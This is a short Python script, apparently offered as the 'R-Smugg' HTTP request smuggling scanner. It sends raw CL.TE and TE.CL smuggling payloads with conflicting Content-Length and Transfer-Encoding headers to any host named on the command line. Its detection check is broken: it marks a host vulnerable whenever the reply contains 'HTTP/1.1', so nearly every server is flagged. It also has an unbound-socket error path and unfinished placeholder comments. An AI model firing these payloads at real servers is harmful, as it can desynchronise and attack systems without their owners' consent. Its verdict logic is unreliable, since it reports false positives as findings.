print(r"""
 /$$$$$$$           /$$$$$$                                             
| $$__  $$         /$$__  $$                                            
| $$  \ $$        | $$  \__/ /$$$$$$/$$$$  /$$   /$$  /$$$$$$   /$$$$$$ 
| $$$$$$$/ /$$$$$$|  $$$$$$ | $$_  $$_  $$| $$  | $$ /$$__  $$ /$$__  $$
| $$__  $$|______/ \____  $$| $$ \ $$ \ $$| $$  | $$| $$  \ $$| $$  \ $$
| $$  \ $$         /$$  \ $$| $$ | $$ | $$| $$  | $$| $$  | $$| $$  | $$
| $$  | $$        |  $$$$$$/| $$ | $$ | $$|  $$$$$$/|  $$$$$$$|  $$$$$$$
|__/  |__/         \______/ |__/ |__/ |__/ \______/  \____  $$ \____  $$
                                                     /$$  \ $$ /$$  \ $$
                                                    |  $$$$$$/|  $$$$$$/
                                                     \______/  \______/ 
========================================================================
[*] [R-Smugg V 1.0 - HTTP Smuggler Scanner] [Afrizal F.A - R&D ICWR]
========================================================================
""")

import socket
import ssl
import argparse
import atexit
from concurrent.futures import ThreadPoolExecutor as T

class R_Smugg:

    def __init__(self, host, port=80, use_ssl=False, path=""):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.path = f"/{path}" if path and path[0] != '/' else path if path else "/"
        self.result = ''
        atexit.register(self.at_exit_func)

    def at_exit_func(self):
        if self.result:
            print("\n[+] [Result]\n")
            print(self.result)
        else:
            print("\n[-] [No result]")

    def payloads(self):
        path = self.path
        payloads = {
            "CL.TE": f"POST {path} HTTP/1.1\r\nHost: {self.host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL": f"POST {path} HTTP/1.1\r\nHost: {self.host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n",
            # Tambahkan payload lainnya di sini
        }
        return payloads

    def smuggling(self, payload_name, payload):
        try:
            sock = socket.create_connection((self.host, self.port))
            if self.use_ssl:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=self.host)

            sock.sendall(payload.encode())
            response = sock.recv(1024).decode()
            
            # Tambahkan logika untuk memproses 'response' di sini

            if "HTTP/1.1" in response:
                self.result += f"[+] {payload_name} detected\n"

        except socket.error as e:
            print(f"[-] [Error] {e}")
        finally:
            sock.close()

    def run(self):
        with T(max_workers=10) as executor:
            futures = [
                executor.submit(self.smuggling, name, payload)
                for name, payload in self.payloads().items()
            ]
            for future in futures:
                future.result()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='HTTP Smuggler Scanner')
    parser.add_argument('--host', required=True, help='Target host')
    parser.add_argument('--port', type=int, default=80, help='Target port')
    parser.add_argument('--ssl', action='store_true', help='Use SSL (https)')
    parser.add_argument('--path', default='', help='Target path')
    
    args = parser.parse_args()

    scanner = R_Smugg(host=args.host, port=args.port, use_ssl=args.ssl, path=args.path)
    scanner.run()
